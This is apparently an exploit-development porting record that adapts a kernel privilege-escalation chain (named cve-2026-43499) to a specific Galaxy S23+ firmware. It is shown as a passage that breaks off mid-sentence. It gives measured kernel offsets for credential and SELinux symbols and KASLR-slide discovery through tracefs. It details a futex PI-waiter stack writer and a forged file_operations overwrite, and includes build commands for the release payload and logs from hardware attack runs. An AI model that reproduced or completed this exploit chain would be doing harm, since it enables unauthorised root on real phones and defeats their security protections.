# Galaxy S23+ SM-S916B / S916BXXUAGZIF port

## Status

**Measured, built, not yet run on hardware.** Every number in `measured.h` was taken from the Image
this phone runs, and the target builds at the fixed release size. What is missing is the last step that
no tool can do: one attempt, in `adb shell`, on the device itself - and the root that attempt currently
needs is not on the phone (see "What the device would not answer").

The sibling port `dm2q-S916BXXSAFZG1` (`docs/SM-S916B-S916BXXSAFZG1.md`) is the reference: same device,
same kernel branch, previous release. It is where the layout constants in `target.h` come from, and its
`target.h` is what the report diffs against. Nothing in `measured.h` is copied from it.

## Exact target

| Field | Value | Source |
| --- | --- | --- |
| Model | `SM-S916B` Galaxy S23+ | device |
| Kernel | `5.15.197-android13-8-34343818-abS916BXXUAGZIF` | `uname -r` on the device |
| Kernel version | `5.15.197` | leading three parts of the above |
| KMI | `android13-5.15` | `android13-8` in the release string |
| Firmware | `S916BXXUAGZIF` | kernel build id |
| Build fingerprint | `samsung/dm2qxeea/dm2q:17/CP2A.260605.016/S916BXXUAGZIF:user/release-keys` | `getprop ro.build.fingerprint` |
| Payload profile | `dm2q-S916BXXUAGZIF` | this directory |
| Reference | `dm2q-S916BXXSAFZG1` (5.15.189) | `docs/SM-S916B-S916BXXSAFZG1.md` |

## The Image every number came from

No measurement here is a property of a nearby build. They are read from this partition and this Image,
and those two hashes are what makes that checkable later:

| Artifact | Size | SHA-256 |
| --- | ---: | --- |
| `boot.img` (`dd if=/dev/block/by-name/boot`) | 100663296 | `ed1c34b5b4ed4b914a3f27cf263e1374307d0349932f23b7aa336401750c8121` |
| raw ARM64 `Image` (`tools/port/kernel_image.py --boot`) | 46860800 | `cc591b86147419b679f3c82b858fac09ccc44abbef560fe8ce9dc8e01bb1a2c5` |
| `vmlinux.elf` (`vmlinux-to-elf`, symbols only) | 53130062 | `fab4d313ac93dfbfe5418ef29704748d704d08ed8879959046919971a114489a` |
| `vmlinux.nm` (`llvm-nm --numeric-sort`) | 5636523 | `54d9e1d7c1bc3f3fff35c58329abc698605b948f55695b6c1242cb461d374446` |

`vmlinux-to-elf` recovered **126441** symbols at image base `0xffffffc008000000`. Its `.nm` has 126451
lines, the extra ten being undefined and absolute symbols that are not offsets.

The Image's own header is worth reading before using any of it, because two constants come straight out
of it and one of them is *not* the sibling's:

```text
file bytes      0x2cb0a00  (46860800)
text_offset     0x0
image_size      0x2f50000  (49610752)
magic           "ARM\x64"   (little-endian)
not stored      0x29f600    (2749952 bytes, .bss)
```

- **`_end - _text` equals `image_size`, and the file is shorter.** `_end` is `0xffffffc00af50000`, so
  the image occupies `0x2f50000` of memory, but a boot partition stores only the initialised segments:
  2 749 952 bytes of `.bss` are not in the file. Some of the constants this port needs live in that
  un-stored region (`SLIDE_SYSCTL_BOOTID_OFF` is one), so a file that stops before them is expected and
  `tools/port/kernel_image.py` accepts it; a file *longer* than its header's `image_size` is a
  different kind of mistake and is refused.
- **`text_offset` is `0`**, so `P0_KERNEL_PHYS_LOAD` is `0x80000000`, not the sibling's `0x80080000`
  (`0x80000000 + 0x80000`). That is the older `text_offset = 0x80000` convention; this kernel does not
  use it, and copying the sibling's value would put every physical access 512 KiB high.

## What the device itself answered

Read over `adb` on 2026-11-23, from `uid=2000(shell)` `u:r:shell:s0` - the domain the chain runs in.
None of this needed root, and it settles questions that were previously inference:

| Reading | Value | Why it matters |
| --- | --- | --- |
| `uname -r` | `5.15.197-android13-8-34343818-abS916BXXUAGZIF` | the port's exact target |
| `ro.build.fingerprint` | `samsung/dm2qxeea/dm2q:17/CP2A.260605.016/S916BXXUAGZIF:user/release-keys` | matches the public firmware listing for this PDA, so the phone is on the stock build |
| `sched:sched_blocked_reason/id` | **`108`** | `SLIDE_TRACEFS_EVENT_ID`, measured rather than computed from the event table |
| `/proc/mounts` (tracefs) | `tracefs rw,seclabel,relatime,gid=3012`, and `shell` is in gid 3012 | slide discovery is readable from `adb shell` |
| `.../sched_blocked_reason/enable` | `-rw-rw-rw-` | and writable, so the chain can turn the event on without root |
| `/proc/kallsyms` | `Permission denied` | the symbol half cannot be read from `shell`; it needs root or the Image |
| `/sys/kernel/btf/vmlinux` | `Permission denied` | the layout check cannot be read from `shell` either |
| `/proc/config.gz` (42167 B) | see below | the config decides which offsets apply at all |

From that config: `CONFIG_KALLSYMS_ALL=y` (so `sysctl_bootid` and `random_table` are named symbols),
`CONFIG_DEBUG_INFO_BTF=y` (the Image carries a BTF blob, so `tools/port/btf.py` has something to read),
`CONFIG_ASHMEM=y` and `CONFIG_CONFIGFS_FS=y` (the two routes the chain uses exist), `CONFIG_MODVERSIONS=y`
with `CONFIG_MODULE_SIG=y` but `# CONFIG_MODULE_SIG_FORCE is not set` (a module must match this build's
vermagics and CRCs, and is signed but not rejected for it), `CONFIG_RANDOMIZE_BASE=y`, and no
`CONFIG_RANDSTRUCT` at all (struct layouts follow the source order, which is why `ctl_table`'s `data`
at `+8` worked for the sibling port - and `tools/port/random_table.py` searches for it anyway).

`# CONFIG_SCHED_TRACER is not set` is not a problem despite the name: `sched_blocked_reason` comes from
`CONFIG_TRACEPOINTS`, which is on, and the event answered with an id.

## What the device would not answer

Root, and that is what is still missing:

- no `su` on `PATH`, and the KernelSU manager is installed without its driver loaded - the late-load
  that was running earlier in the day is gone after the last soft reboot;
- `adb root` refuses (`adbd cannot run as root in production builds`, `ro.debuggable=0`, `ro.build.type=user`);
- `/dev/block/by-name/boot` is `brw-------  root root`, so `shell` cannot read the partition.

The Image was therefore pulled while the late-load was still up; a re-measurement on a phone without
root needs either that again or `boot.img.lz4` from the `AP_*.tar.md5` for this PDA. Everything after
that is a command - see "The measurement, in order".

## Measured values

`tools/port/target_report.py` produced **26** values: 25 measured from the Image, plus the event id read
on the device. Most are `symbol - _text`, which is why a `/proc/kallsyms` dump from a rooted phone is
equally good input - the slide cancels in the subtraction. The four that are not a symbol's own address
are called out below the table.

| Macro | Value | Measured from |
| --- | ---: | --- |
| `INIT_TASK_OFF` | `0x02c05400` | `init_task` |
| `PREPARE_KERNEL_CRED_OFF` | `0x0011e694` | `prepare_kernel_cred` |
| `COMMIT_CREDS_OFF` | `0x001203d0` | `commit_creds` |
| `OVERRIDE_CREDS_OFF` | `0x0011f4a8` | `override_creds` |
| `ROOT_TASK_GROUP_OFF` | `0x02cb9ac0` | `root_task_group` (the one symbol that did not move) |
| `SELINUX_ENFORCING_OFF` | `0x02d8e600` | `selinux_state` |
| `KMALLOC_CACHES_OFF` | `0x020671f0` | `kmalloc_caches` |
| `ANON_PIPE_BUF_OPS_OFF` | `0x01e81d20` | `anon_pipe_buf_ops` |
| `SYSTEM_UNBOUND_WQ_OFF` | `0x02a90808` | `system_unbound_wq` |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `0x00104888` | `call_usermodehelper_exec_work` |
| `ASHMEM_FOPS_OFF` | `0x020100f8` | `ashmem_fops` |
| `ASHMEM_MISC_FOPS_OFF` | `0x02bfd278` | `ashmem_fops` pointer inside the miscdevice named `"ashmem"` |
| `ASHMEM_IOCTL_OFF` | `0x011513a0` | `ashmem_ioctl` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `0x011519fc` | `compat_ashmem_ioctl` |
| `ASHMEM_MMAP_OFF` | `0x01151a54` | `ashmem_mmap` |
| `ASHMEM_OPEN_OFF` | `0x01151d34` | `ashmem_open` |
| `ASHMEM_RELEASE_OFF` | `0x01151dcc` | `ashmem_release` |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x01151ee8` | `ashmem_show_fdinfo` |
| `CONFIGFS_READ_ITER_OFF` | `0x005d8a1c` | `configfs_read_iter` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `0x005d9444` | `configfs_bin_write_iter` |
| `COPY_SPLICE_READ_OFF` | `0x00528e28` | `generic_file_splice_read` (this tree has no `copy_splice_read`) |
| `NOOP_LLSEEK_OFF` | `0x004bc6b4` | `noop_llseek` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `0x02a91e50` | `nfulnl_logger` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `0x01d607d9` | `nfulnl_logger`'s first qword, which holds `"nfnetlink_log"` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `0x02e6c131` | `sysctl_bootid` |
| `SLIDE_TRACEFS_EVENT_ID` | `108` | `/sys/kernel/tracing/events/sched/sched_blocked_reason/id` |

### `random_table`'s `boot_id` entry

No symbol names this one: it is the address of the `data` field inside an element of an array.

| Macro | Value | How |
| --- | ---: | --- |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `0x02bbabc8` | `random_table` at `0x02bbaac0`; entry 4 at `+0x100`; `data` at `+0x8` |

The tool does not count entries. It walks the array until the terminator, and finds the entry whose
`data` slot holds the address of `sysctl_bootid`. Read back out of the Image, the six entries are:

```text
0  poolsize                 data -> 0xffffffc00abbaab0   (maxlen=4, mode=0x124)
1  entropy_avail            data -> 0xffffffc00abbaa94
2  write_wakeup_threshold   data -> 0xffffffc00abbaab4
3  urandom_min_reseed_secs  data -> 0xffffffc00abbaab8
4  boot_id                  data -> 0xffffffc00ae6c131   <- sysctl_bootid
5  uuid                     data -> 0
```

`0xffffffc00ae6c131 - 0xffffffc008000000 = 0x02e6c131`, which is exactly the `sysctl_bootid` symbol:
the two measurements agree, which is the check that the entry found is the entry meant. That address is
past the stored end of the file (`0x2cb0a00`), i.e. in `.bss` - so the *pointer* is in the Image and the
*storage* is not, which is why this macro comes from a scan of the array rather than from a symbol
offset alone.

## Carried layout, checked against this build's BTF

The rest of `target.h` is the shape of a 5.15 Samsung kernel, and `tools/port/layout_check.py` compares
every one of those carried constants with this build's own BTF: **53 constants, all `same`**.

The structs it compares against, as this build's BTF reports them:

| Struct | Size |
| --- | ---: |
| `task_struct` | `0x1200` |
| `rt_mutex_waiter` | `0x58` |
| `page` | `0x40` |
| `file_operations` | `0x120` |
| `configfs_buffer` | `0x80` |
| `pool_workqueue` | `0x100` |
| `worker_pool` | `0x380` |
| `work_struct` | `0x30` |
| `workqueue_struct` | `0x140` |
| `pipe_buffer` | `0x28` |
| `miscdevice` | `0x50` |
| `mm_struct` | `0x3e0` |

The blob itself is at `[0x21f29dc, 0x27c3953)` in the Image (6098807 bytes, 11196 structs), found by
validating the full header rather than the four-byte magic: this Image contains three other `0xeb9f`
byte pairs whose header length or section bounds are nonsense.

`struct page` is the one worth explaining twice: `compound_head`, `page_type` and `slab_cache` do not
exist as direct members - they live inside anonymous unions, and BTF records those as a nameless member
whose type is the union. `tools/port/btf.py` expands them, because a reader that stopped at the direct
members would compare `STRUCT_PAGE_COMPOUND_HEAD_OFF` against a union's offset and call it wrong.

### `MM_STRUCT_SZ` is not `sizeof(struct mm_struct)`

BTF says `sizeof(struct mm_struct)` is `0x3e0`, and the header carries `0x400`. Both are right, and this
is the number a checker is most likely to "correct" into a wrong one:

- `0x3e0` selects `kmalloc-1024` - that is what the size is for;
- `0x400` is that cache's object **stride**, and the reclaim arithmetic is `slot = (mm - base) / MM_STRUCT_SZ`
  over objects in their cache, so it needs the stride, not the struct.

`tools/port/layout_check.py` therefore leaves `MM_STRUCT_SZ` out of the table, and so do the flag bits
and page positions (`PIPE_BUF_FLAG_CAN_MERGE`, `MCAST_WAITER_OFF`, `SIGRETURN_*_WAITER_OFF`,
`P0_ORACLE_*`). A comment in `target.h` says the same thing where a reader will meet it first.

### `MCAST_WAITER_OFF` is not a struct field, so it was re-derived from the code

`layout_check.py` can only compare struct members. `MCAST_WAITER_OFF` is the distance between two kernel
*stack frames*, carried here as `0x78` from the sibling. A wrong value is silent at runtime - the writer
still reports its window and simply writes nothing that lands - so it was re-derived against this Image
using the recipe the `X916B` record documents, with every frame size read out of the disassembly:

| Chain | Function | Frame | Local |
| --- | --- | ---: | --- |
| futex | `do_el0_svc` | `0x10` | |
| | `el0_svc_common` | `0x30` | |
| | `invoke_syscall` | `0x20` | |
| | `__arm64_sys_futex` | `0x80` | |
| | `do_futex` | `0x140` | |
| | `futex_wait_requeue_pi` | `0x1b0` | `rt_mutex_waiter` at `sp+0x98` - the `add x1/x2/x3, sp, #0x98` operands of `remove_waiter`, `try_to_take_rt_mutex` and `rt_mutex_slowlock_block` |
| setsockopt | `__arm64_sys_setsockopt` | `0x10` | |
| | `__sys_setsockopt` | `0x70` | |
| | `sock_common_setsockopt` | `0x10` | |
| | `ipv6_setsockopt` | `0x40` | |
| | `do_ipv6_setsockopt` | `0x60 + 0x260 = 0x2c0` | `group_source_req` at `sp+0x40` - `add x0, sp, #0x40` with `mov w2, #0x108` before `_copy_from_user` |

`do_ipv6_setsockopt` is the one that misreads on a first pass: its prologue starts
`stp x29, x30, [sp, #-0x60]!`, and the remaining `sub sp, sp, #0x260` appears a few instructions later
in the same prologue, so the frame is `0x2c0`, not `0x60`.

```text
waiter           = E - (0x10+0x30+0x20+0x80+0x140+0x1b0) + 0x98 = E - 0x338
greqs            = E - (0x10+0x30+0x20+0x10+0x70+0x10+0x40+0x2c0) + 0x40 = E - 0x3b0
MCAST_WAITER_OFF = 0x3b0 - 0x338 = 0x78
```

So the carried `0x78` is correct for this firmware too, and the writer stage is not where run 5 failed
because of a moved offset. The `0x108` is a second confirmation that the option really is
`struct group_source_req` (`4 + 4 + 128 + 128`), and that `stamp + 0x08` is `gsr_group.ss_family` - which
is why the forged `AF_UNSPEC` placed there is what turns into the `EADDRNOTAVAIL` the writer treats as
its window flag.

## Tracefs event id and the two return addresses

The slide's discovery reads `sched_blocked_reason` records, so it needs the event id and the return
address the kernel will report for a blocked worker. The id is `108` from the device. The two addresses
are instructions, found by disassembling the symbolized ELF:

| Macro | Symbol | Instruction | Address | Offset |
| --- | --- | --- | --- | ---: |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `worker_thread` | `bl schedule` | `0xffffffc00810ddf8`, next instruction `0xffffffc00810ddfc` | `0x0010ddfc` |
| `SLIDE_TRACEFS_VFORK_CALLER_OFF` | `wait_for_vfork_done` | `bl wait_for_common` | `0xffffffc0080c90b8`, next instruction `0xffffffc0080c90bc` | `0x000c90bc` |

Both are `instruction - 0xffffffc008000000`, and both are recorded in `measured.h` as *given on the
command line*: they came from a person reading a disassembly, not from a tool that can be re-run, and
the header says so instead of implying otherwise. The sibling's values (`0x0010db44`, `0x000c8fe4`) are
close but not equal, which is the point of measuring them: the functions are stable, their addresses are
not.

`SLIDE_TRACEFS_EVENT_ID` being `108` on two consecutive releases is a coincidence worth knowing, not a
constant to copy - the id is assigned in linker order, and this port reads it from the phone anyway.

## The P0 fingerprint

`tools/generate_p0_fingerprint.pl ../kernel-S916BXXUAGZIF 0x1f0000 ...` wrote 32 rows of 8 qwords from
the exact Image, and verified each of the 256 source qwords by reading it back through a second file
handle ("verified 32 rows and 256 source qwords at probe 0x1f0000"). `p0_fingerprint.h` is checked in
with that hash-identified Image behind it; a table generated from a different boot partition would
fingerprint the wrong kernel and the oracle would reject every candidate.

## Build

`APP_PUBLISH_RECIPE` for this target is `release`, so that is the artifact a device would be handed:

```sh
ANDROID_NDK_HOME=~/Library/Android/sdk/ndk/28.2.13676358 \
  make TARGET=dm2q-S916BXXUAGZIF release
```

| Recipe | Artifact | Size | SHA-256 (this build) |
| --- | --- | ---: | --- |
| `release` (padded to `APP_RELEASE_SIZE`) | `cve-2026-43499-app.release.so` | 104128 | `ff73553a1b676de8d96c39234ac1d01ff3b757cd0ddef2d758d1d0aa80332a72` |
| `all` (app payload) | `cve-2026-43499-app.so` | 132920 | `88fa384b8d21d8ccae0a7c26ece364c664950b05d168ea31445dadedfde6757e` |
| `all` (preload) | `cve-2026-43499` | 106440 | `8e444b328e88595bea09a049a2905d7a2d3dc2161ca278b9d24e9af648904ceb` |
| `all` (root helper) | `cve-2026-43499-root` | 26896 | - |

Two things about this build are worth writing down rather than discovering again:

- **`stat -c` and `truncate -s` are GNU.** On macOS the `release` recipe compiles and links, then dies
  at `test $$(stat -c %s $@) -le 104128`, because BSD `stat` has no `-c`. The artifact is still correct
  up to the padding, and `/usr/bin/truncate -s 104128` finishes it by hand; the padding is what the
  size promise is about, and a 97864-byte file is the same payload without it. CI on Linux is
  unaffected.
- **`make stable` cannot build this target, and does not build its sibling either.** The `stable`
  recipe does not pass `$(APP_TARGET_CFLAGS)`, so `-DSLIDE_STACK_WRITER=1` is missing and `target.h`
  refuses with `this target's stack writer must be set by the build`. Six targets have that guard and
  none defines `APP_S928_STABLE_RACE`, so the recipe is unusable for all of them - a pre-existing gap,
  not a property of this port. It is not patched here: enabling the S928 race variant for this phone is
  a decision nobody has validated, and a port is not the place to change what a recipe means.

`src/util.c:210` also warns `unused function 'configure_slide_bank_geometry'`, identically to the
sibling. The call site (`src/util.c:2268`) sits in the `#else` of `#if APP_CONTROLLED_MM_GROUP_RECLAIM`,
which this target sets, and for a non-S928 target the function only reassigns `SLIDE_BANK_LOCK_OFF` and
`SLIDE_BANK_TASK_OFF` to the values their statics already hold. Dead code that changes nothing, in both
ports; recorded so nobody spends an afternoon on it twice.

## What this port got wrong before it was right

The tools in `tools/port/` were written to make this port mechanical, and measuring a real firmware is
what found the bugs in them. Each one produced a plausible number rather than an error, which is the
failure mode the whole split between "measured" and "decided" exists to prevent:

1. **`SLIDE_SYSCTL_BOOTID_OFF` was the wrong string.** It searched `.rodata` for `"boot_id"` and got
   `0x01dfea78` - the `procname` of the sysctl entry. The constant means the UUID *storage* the entry
   points at, `0x02e6c131`, over 16 MiB away. Both exist in the kernel; only the pointer says which.
2. **`SLIDE_NFULNL_LOGGER_NAME_OFF` was the wrong name.** The object is `nfulnl_logger`; the string it
   holds is `"nfnetlink_log"`, and there is no `"nfulnl_logger"` string in the Image at all. It is now
   read by dereferencing the object's first qword and checking that what it finds is a printable string
   inside the Image.
3. **`ASHMEM_MISC_FOPS_OFF` was the wrong object.** The macro is a *field* (`ashmem_misc + 0x10`), and
   the static is called `ashmem_misc` here, `ashmem_miscs` in one port and `ashmem_miscdev` in another,
   so a hardcoded symbol list matched nothing. It is found by the `ashmem_fops` pointer the field holds,
   with the miscdevice's `name` at `-0x8` checked to be `"ashmem"`, and a bare `ashmem_fops` pointer
   elsewhere in `.data` does not count.
4. **`btf.py` desynchronised its type walk at type 139399.** `VAR` and `DECL_TAG` records have
   `vlen == 0` and a one-word payload; sizing them as `4 * vlen` consumed nothing, so every later record
   was read from inside the previous one. The walk got 139399 types in before reporting a "kind 0" that
   was really the middle of a type. Anonymous struct/union expansion was added in the same pass, because
   half of `struct page` is behind it, and the dump now reports each struct's `size`.
5. **`random_table.py` had never run its own main path.** `MACRO` was referenced but never defined, so
   the self-test passed (it bypasses `main`) and the first real invocation died with `NameError`. A
   self-test that does not execute the reporting path is not a test of the tool.
6. **`emit_target.py` put the P0 table before `<stdint.h>`.** It emitted `#include "p0_fingerprint.h"`
   into `measured.h`, which is reached from `offset.h`, which `common.h` includes first - so
   `uint16_t`/`uint64_t` were unknown types. The repository's convention is `P0_FINGERPRINT_HEADER` in
   `target.h` and one `#include` in `src/pipe.c` after the standard headers; the generator now follows
   it, and checks the table exists instead of including it.

`COPY_SPLICE_READ_OFF` is a seventh, smaller one: the macro's symbol list assumed `copy_splice_read`,
which this 5.15 tree does not have. The report now tries both names of the same operation and records
which one answered.

## The measurement, in order

```sh
# 0. the scaffold itself, before it has numbers (also the CI pre-check)
tools/port/syntax_check.py --target dm2q-S916BXXUAGZIF --reference dm2q-S916BXXSAFZG1

# 1. the Image this phone runs
adb shell su -c 'dd if=/dev/block/by-name/boot of=/data/local/tmp/boot.img'
adb pull /data/local/tmp/boot.img
tools/port/kernel_image.py --boot boot.img --out kernel

# 2. symbols, and the P0 rows the oracle compares against
vmlinux-to-elf kernel vmlinux.elf
llvm-nm --numeric-sort vmlinux.elf > vmlinux.nm
perl tools/generate_p0_fingerprint.pl kernel 0x1f0000 \
  src/targets/dm2q-S916BXXUAGZIF/p0_fingerprint.h

# 3. what this kernel exports, against the previous release's header
tools/port/target_report.py --symbols vmlinux.nm --image kernel \
  --reference src/targets/dm2q-S916BXXSAFZG1/target.h \
  --trace-event-id 108 --json report.json

# 4. BTF: the struct layouts the carried header claims
tools/port/btf.py --image kernel --struct task_struct --struct rt_mutex_waiter \
  --struct page --struct file_operations --struct configfs_buffer \
  --struct pool_workqueue --struct worker_pool --struct work_struct \
  --struct workqueue_struct --struct pipe_buffer --struct miscdevice \
  --struct mm_struct --json btf.json

# 5. the one struct-internal pointer, and the callers from disassembly
tools/port/random_table.py --symbols vmlinux.nm --image kernel --json random_table.json
llvm-objdump --disassemble-symbols=worker_thread vmlinux.elf      # bl schedule, then next insn
llvm-objdump --disassemble-symbols=wait_for_vfork_done vmlinux.elf

# 6. the header, then the two checks that read it back
tools/port/emit_target.py --report report.json --extra-json random_table.json \
  --extra SLIDE_TRACEFS_WORKER_CALLER_OFF=0x10ddfc \
  --extra SLIDE_TRACEFS_VFORK_CALLER_OFF=0xc90bc \
  --kimage-text-base 0xffffffc008000000 --physical-load 0x80000000 \
  --build-fingerprint "<ro.build.fingerprint>" \
  --fingerprint src/targets/dm2q-S916BXXUAGZIF/p0_fingerprint.h \
  --out src/targets/dm2q-S916BXXUAGZIF/measured.h
tools/port/layout_check.py --btf btf.json \
  --header src/targets/dm2q-S916BXXUAGZIF/target.h
tools/port/syntax_check.py --target dm2q-S916BXXUAGZIF --reference dm2q-S916BXXSAFZG1

# 7. build, at the fixed release size
make TARGET=dm2q-S916BXXUAGZIF ANDROID_NDK_HOME=<ndk> release
```

`tools/port/README.md` has the two input routes (boot partition, or `/proc/kallsyms` for the symbol
half) and the constants that stay a decision rather than a measurement.

## Hardware runs

Each run is one boot. The rule that shapes the sequence is that a failure *before* the stack writer is
safe to retry, while a failure *after* it leaves PI state behind - so the run that first reached the
writer is also the last one that boot allowed (`stack writer ran; refusing retry on this boot`).

| # | Knob | What it got through | Where it stopped |
| --- | --- | --- | --- |
| 1 | carried profile | slide KASLR (`base=ffffffc008150000`, `slide=0x150000`) | collision search: `only found N collisions` |
| 2 | `KSNITCH_TIMING_DIAG=1` | slide; four collision searches on one boot | same, with the numbers below |
| 3 | `KSNITCH_TIMING_DIAG=1` + pile probe | slide, pile proven complete | collision search: `wanted=4`, `confirmed=1..3` |
| 4 | `KSNITCH_THRESHOLD_MULT=4` | slide; collision search **passed** on every attempt | `dma32` skip only, ~125 s/attempt, out of time at the 420 s cap |
| 5 | `KSNITCH_THRESHOLD_MULT=2`, 900 s | full chain: normal-zone group -> SKB reclaim -> kernel page -> stack writer | fake-fops read-back after the writer (`step=4`) |
| 6 | identical command, fresh boot (control) | full chain again: slide `0x1e0000`, group at attempt 89, page in 128 s, writer `window=1` | read-back again (`step=4`), same `calls=1` |

### The collision stage was a threshold bug, not a pile bug

Run 2 measured the same four searches on one boot:

| `approx_time` | threshold (10x) | min | max | mean | n |
| --- | --- | --- | --- | --- | --- |
| 27 | 270 | 26 | 357 | 27 | 81918 |
| 28 | 280 | 26 | 362 | 27 | 81918 |
| 27 | 270 | 26 | 359 | 27 | 81918 |
| 27 | 270 | 26 | 296 | 27 | 81918 |

The baseline is tight (26-28), so this was never environmental and a reboot would not have moved it.
Run 3 then proved the pile itself lands: `ksnitch pile requested=256 created=256 woke=256
wake_all=720123 per_entry=2812`. All 256 waiters enqueue, and one traversal of the piled bucket costs
~2812 cycles. The scan probes 81918 keys against `hash_table_size = 256 * cpu_cnt = 4096`, so ~40 of
them should land in the piled bucket (Poisson mean `81918/2048`, sigma ~6); exactly **36** do on every
run, and their histogram is `over2=36 over5=36 over10=2..6`. The band between 2x and 5x is empty, which
says the 36 are the pile and nothing else, and that the pile-time signal is only ~5-13x the baseline
(135-370 ticks), **not** the 30x the carried `10` multiplier assumed. With threshold 270 only a handful
of probes cross and the 3-confirmation gate discards most of those.

The `pthread_create` accounting bug found while building the diagnostic is real and fixed
(`pthread_create` returns `+errno` and never `-1`, so `SYSCHK` had been silently accepting a short
pile), but it was not this failure: run 3 reports `created=256`.

`mult=2` admits exactly the same 36 probes as `mult=5` (the histogram proves it) and makes their
repeats reliable, so it is the value now compiled into `target.h`. The environment override stays for
one-boot sweeps.

### Run 5: the chain reached the stack writer

```
controlled mm group full group=2 base=ffffff8850270000 attempts=63 zone=normal
controlled skb reclaim sends=8192 pairs=32 per_pair=256 ... mode=0
kernel page prepare mode=0 attempt=1/2 elapsed_ms=98459 base=ffffff8850270000
app fops slide route parent=ffffff8850271180 target=ffffffc00ad4d278 lock=ffffff8850271390
slide pi stage=writer-enter tid=8715
slide mcast returned domain=10 level=41 option=46 offset=0x78 ret=-1 errno=99 calls=1 sched_ok=1
slide pi stage=writer-return tid=8715 sched_ok=1 window=1
p0 physical write status=0 ok=1
cfi misc_fops mismatch ret=0 target=ffffffc00ad4d278 read=0000000000000000 want=ffffff8850271180 errno=0
```

`target=ffffffc00ad4d278` is `ashmem_misc + 0x10` after the `0x150000` slide, i.e. exactly
`&ashmem_misc.fops`; `want=ffffff8850271180` is `fake_fops`. The writer reports the scheduling window
was hit (`window=1`) and its trigger returned success, but the read-back does not see `fake_fops`.

That read-back was checked against this kernel's own code before it was believed. `configfs_read_iter`
copies `buffer->count - ki_pos` bytes from `buffer->page + ki_pos`, and returns 0 when
`count <= ki_pos`. The forged `configfs_buffer` overlays `ashmem_area`, whose name is prefixed with the
11-byte `dev/ashmem/`, so `buffer->count` is the fixed first qword of that prefix - which is exactly
`ASHMEM_PREFIX_COUNT`, and `configfs_read_once` picks `pos = ASHMEM_PREFIX_COUNT - window` so that
`count - pos = window >= len` and `page + pos == target`. The disassembly of `ashmem_ioctl`
(`strscpy(asma + 11, user, 256)`) confirms the blob lands at `asma + 11`, so `page` and
`needs_read_fill` land at `configfs_buffer.page` and `.needs_read_fill`. In other words the forge is
sound and a correct install would return 8 bytes. `ret=0` is what the *real* `ashmem_read_iter`
returns when `[private_data + 0x128] == 0`, so on this boot the fake table was **not** installed -
the PI write ran to a scheduling window but did not land in `&ashmem_misc.fops`.

### Run 6: the miss is deterministic, so it is not the documented 50% race

Run 6 repeated the exact same command on a fresh boot and reproduced run 5 line for line, with a different
KASLR slide and a different reclaimed page:

| | run 5 | run 6 |
| --- | --- | --- |
| slide | `0x150000`, base `ffffffc008150000` | `0x1e0000`, base `ffffffc0081e0000` |
| reclaimed base | `ffffff8850270000` | `ffffff8895f38000` |
| collision group | 2, attempt 63 | 5, attempt 89 |
| kernel page | 98 s | 128 s |
| writer | `cmp-return errno=35`, `wait_requeue_pi errno=110`, `mcast errno=99`, `calls=1 sched_ok=1`, `window=1` | identical |
| read-back | `mismatch ret=0 read=0` | identical |

That is two independent boots, two different address layouts, one outcome. The `X916B` record's "succeeds
about half the time" does not apply to this profile: there is no coin to land, the write is never produced.

It also means the writer's own success flags do not measure the write. `window=1` only means
`setsockopt` returned `EADDRNOTAVAIL` while a `sched_setattr` on the waiter tid had succeeded; both are
upstream of the forged erase and are true on a miss. `calls=1` is the useful number: the consumer's chain
trigger ran exactly once, after `slide_consume_go` was set - and that store happens *after* `setsockopt`
returns - so the forged copy had already been made and the syscall frame already unwound when the only
`sched_setattr` fired.

The open question is therefore not timing but reachability: whether the kernel still holds a reference to
the waiter by the time the copy lands. `futex_wait_requeue_pi` returns `-ETIMEDOUT` *before* the writer
runs, and its cleanup removes the waiter from the PI lock and clears `pi_blocked_on`, which is exactly the
reference a later `sched_setattr` would walk. Verifying that against this kernel's `remove_waiter` gating
is the next offline step, because a fix that only re-times the `sched_setattr` cannot help if the waiter
is already unlinked.

That step is done, and the answer is the one this run's evidence predicted: on every stock 5.15 path the
waiter is unlinked before the copy lands, so the writer as shipped is unreachable here. The next section
records the proof at the source, the Android-base and the binary level.

## The writer's trigger is unreachable on this build

Run 6 closed the timing explanation. What was left was a kernel-version explanation: the sibling ran the
same app on `S916BXXSAFZG1` (`5.15.189`) and reached root, this build is `S916BXXUAGZIF` (`5.15.197`), and
the one place a behaviour difference could hide is the PI-waiter cleanup. Specifically, if the sibling's
tree were old enough that `rt_mutex_start_proxy_lock()` did **not** remove the waiter on `-EDEADLK`, the
`cmp` syscall would leave `pi_blocked_on` pointing at the waiter, the app's later `setsockattr` would walk
the forged copy, and the write would land - exactly what the app is built to rely on.

That explanation is dead. It fails independently at the source level, the patch-series level and the
binary level.

### The split predates both firmwares

The removing wrapper is not a later fix. The original upstream tag `v5.15` already ships
`kernel/locking/rtmutex_api.c` with both functions:

```text
__rt_mutex_start_proxy_lock   enqueues unconditionally, does NOT remove on failure
rt_mutex_start_proxy_lock     calls __rt_mutex_start_proxy_lock(), then
                              if (unlikely(ret)) remove_waiter(lock, waiter)
```

The commit that split them, `531ae4b06a73 "locking/rtmutex: Split API from implementation"`, is dated
`2021-08-17` and `git merge-base --is-ancestor` confirms it is an ancestor of
`android13-5.15.189_r00`. A tree that has the split cannot lack the removal.

### The exact Android bases are identical

`S916BXXSAFZG1` and `S916BXXUAGZIF` both sit on ACK `android13-5.15`; the local partial clone of
`kernel/common` carries the exact tags. Diffing them:

```text
git diff --stat android13-5.15.189_r00 android13-5.15.197_r00 -- kernel/locking/ kernel/futex/
(no output)                                     # every file identical

git diff --stat android13-5.15.189_r00 android13-5.15.197_r00 -- kernel/sched/
kernel/sched/core.c               | 27 +++++
kernel/sched/cpufreq_schedutil.c  | 28 +++++
kernel/sched/deadline.c           |  4 +-
kernel/sched/fair.c               | 39 +++---
kernel/sched/rt.c                 |  6 +
kernel/sched/vendor_hooks.c       |  5 +
```

The whole `kernel/sched/core.c` delta is `get_wchan()`, three Android `trace_android_vh_*` hooks and
`EXPORT_SYMBOL_GPL(cpu_cgrp_subsys)`. Nothing touches `__sched_setscheduler()`, `sched_setattr()`,
